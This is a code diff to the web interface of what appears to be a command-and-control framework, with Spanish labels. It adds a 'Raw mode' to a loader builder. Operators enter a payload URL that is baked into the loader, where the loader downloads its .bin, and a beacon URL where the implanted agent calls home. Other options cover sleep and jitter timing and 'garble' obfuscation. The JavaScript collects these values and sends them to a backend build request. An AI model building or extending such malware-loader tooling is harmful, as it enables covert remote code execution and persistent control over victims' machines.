@@ -1381,21 +1381,51 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               You only distribute the loader. The payload is never embedded.
             </div>
 
-            <!-- Stage URL = where the encrypted blob is hosted -->
-            <div class="form-row">
-              <label>Stage URL <span style="font-weight:400;color:var(--text3)">(donde se hostea el payload cifrado — el loader lo descarga de aquí)</span></label>
-              <div style="display:flex;gap:6px">
-                <input id="ldr-url" placeholder="http://10.0.0.1:8080" style="flex:1" oninput="ldrSyncBeacon()">
-                <button class="btn btn-ghost btn-sm" onclick="ldrFillURL()" title="Fill from active tunnel">↙</button>
+            <!-- Raw payload mode toggle -->
+            <div class="form-row" style="padding:8px 10px;background:var(--bg2);border-radius:6px;border:1px solid var(--border)">
+              <label style="display:flex;align-items:center;gap:8px;cursor:pointer;margin:0">
+                <input type="checkbox" id="ldr-raw" onchange="ldrToggleRaw()" style="cursor:pointer">
+                <span style="font-weight:600">Raw mode</span>
+                <span style="font-weight:400;color:var(--text3)">— genera .bin sin cifrado, loader apunta a URL personalizada</span>
+              </label>
+            </div>
+
+            <!-- Staged mode fields (default) -->
+            <div id="ldr-staged-fields">
+              <!-- Stage URL = where the encrypted blob is hosted -->
+              <div class="form-row">
+                <label>Stage URL <span style="font-weight:400;color:var(--text3)">(donde se hostea el payload cifrado — el loader lo descarga de aquí)</span></label>
+                <div style="display:flex;gap:6px">
+                  <input id="ldr-url" placeholder="http://10.0.0.1:8080" style="flex:1" oninput="ldrSyncBeacon()">
+                  <button class="btn btn-ghost btn-sm" onclick="ldrFillURL()" title="Fill from active tunnel">↙</button>
+                </div>
+              </div>
+
+              <!-- Beacon URL = where the agent calls home -->
+              <div class="form-row">
+                <label>Beacon URL <span style="font-weight:400;color:var(--text3)">(donde el agente hace beacon — puede ser diferente al Stage URL)</span></label>
+                <div style="display:flex;gap:6px">
+                  <input id="ldr-beacon-url" placeholder="mismo que Stage URL" style="flex:1;color:var(--text2)" oninput="ldrBeaconEdited()">
+                  <button class="btn btn-ghost btn-sm" onclick="ldrClearBeacon()" title="Resetear al valor del Stage URL" id="ldr-beacon-clear" style="display:none">✕</button>
+                </div>
               </div>
             </div>
 
-            <!-- Beacon URL = where the agent calls home -->
-            <div class="form-row">
-              <label>Beacon URL <span style="font-weight:400;color:var(--text3)">(donde el agente hace beacon — puede ser diferente al Stage URL)</span></label>
-              <div style="display:flex;gap:6px">
-                <input id="ldr-beacon-url" placeholder="mismo que Stage URL" style="flex:1;color:var(--text2)" oninput="ldrBeaconEdited()">
-                <button class="btn btn-ghost btn-sm" onclick="ldrClearBeacon()" title="Resetear al valor del Stage URL" id="ldr-beacon-clear" style="display:none">✕</button>
+            <!-- Raw mode fields -->
+            <div id="ldr-raw-fields" style="display:none">
+              <!-- Payload URL = exact URL the loader will fetch -->
+              <div class="form-row">
+                <label>Payload URL <span style="font-weight:400;color:var(--text3)">(URL exacta donde hostearás el .bin — se bake en el loader)</span></label>
+                <input id="ldr-payload-url" placeholder="http://10.0.0.1/agente.bin" style="width:100%">
+              </div>
+
+              <!-- Beacon URL in raw mode -->
+              <div class="form-row">
+                <label>Beacon URL <span style="font-weight:400;color:var(--text3)">(donde el agente hace beacon después de ejecutarse)</span></label>
+                <div style="display:flex;gap:6px">
+                  <input id="ldr-raw-beacon-url" placeholder="http://10.0.0.1:8080" style="flex:1">
+                  <button class="btn btn-ghost btn-sm" onclick="ldrFillRawBeacon()" title="Fill from active tunnel">↙</button>
+                </div>
               </div>
             </div>
 
@@ -11989,6 +12019,26 @@ function opsecCheckboxSimple(cb, badgeId) {
 
 let _ldrBeaconManual = false;
 
+function ldrToggleRaw() {
+  const raw = document.getElementById('ldr-raw').checked;
+  document.getElementById('ldr-staged-fields').style.display = raw ? 'none' : '';
+  document.getElementById('ldr-raw-fields').style.display    = raw ? '' : 'none';
+}
+
+function ldrFillRawBeacon() {
+  const stager = document.getElementById('stager-url')?.value ||
+                 document.getElementById('dlv-stageurl')?.value || '';
+  let url = stager;
+  if (!url) {
+    const host = document.getElementById('pay-host')?.value;
+    const port = document.getElementById('pay-port')?.value || '8080';
+    const _lt  = document.getElementById('pay-transport')?.value || 'http';
+    const _ls  = (_lt === 'https' || _lt === 'mtls') ? 'https' : 'http';
+    if (host) url = `${_ls}://${host}:${port}`;
+  }
+  if (url) document.getElementById('ldr-raw-beacon-url').value = url;
+}
+
 function ldrFillURL() {
   const stager = document.getElementById('stager-url')?.value ||
                  document.getElementById('dlv-stageurl')?.value || '';
@@ -12029,27 +12079,46 @@ function ldrClearBeacon() {
 }
 
 async function buildLoader() {
-  const stageURL  = (document.getElementById('ldr-url').value || '').trim();
-  if (!stageURL) { toast('Stage URL requerida', 'red'); return; }
-  const beaconRaw = (document.getElementById('ldr-beacon-url').value || '').trim();
-  const beaconURL = beaconRaw || stageURL;
-
+  const isRaw     = document.getElementById('ldr-raw').checked;
   const loaderFmt = document.getElementById('ldr-type').value;
   const garble    = document.getElementById('ldr-garble').checked;
   const arch      = document.getElementById('ldr-arch').value;
   const sleep     = parseInt(document.getElementById('ldr-sleep').value) || 60;
   const jitter    = parseInt(document.getElementById('ldr-jitter').value) || 20;
 
-  const body = {
-    format:     loaderFmt,
-    stage_url:  stageURL,
-    server_url: beaconURL,
-    transport:  'http',
-    sleep_sec:  sleep,
-    jitter_pct: jitter,
-    garble:     garble,
-    arch:       arch,
-  };
+  let body;
+  if (isRaw) {
+    const payloadURL = (document.getElementById('ldr-payload-url').value || '').trim();
+    const beaconURL  = (document.getElementById('ldr-raw-beacon-url').value || '').trim();
+    if (!payloadURL) { toast('Payload URL requerida', 'red'); return; }
+    if (!beaconURL)  { toast('Beacon URL requerida', 'red'); return; }
+    body = {
+      format:      loaderFmt,
+      raw_payload: true,
+      payload_url: payloadURL,
+      server_url:  beaconURL,
+      transport:   'http',
+      sleep_sec:   sleep,
+      jitter_pct:  jitter,
+      garble:      garble,
+      arch:        arch,
+    };
+  } else {
+    const stageURL  = (document.getElementById('ldr-url').value || '').trim();
+    if (!stageURL) { toast('Stage URL requerida', 'red'); return; }
+    const beaconRaw = (document.getElementById('ldr-beacon-url').value || '').trim();
+    const beaconURL = beaconRaw || stageURL;
+    body = {
+      format:     loaderFmt,
+      stage_url:  stageURL,
+      server_url: beaconURL,
+      transport:  'http',
+      sleep_sec:  sleep,
+      jitter_pct: jitter,
+      garble:     garble,
+      arch:       arch,
+    };
+  }
 
   const res = document.getElementById('ldr-result');
   res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Building… (donut + staging pueden tardar ~30s)</div>';
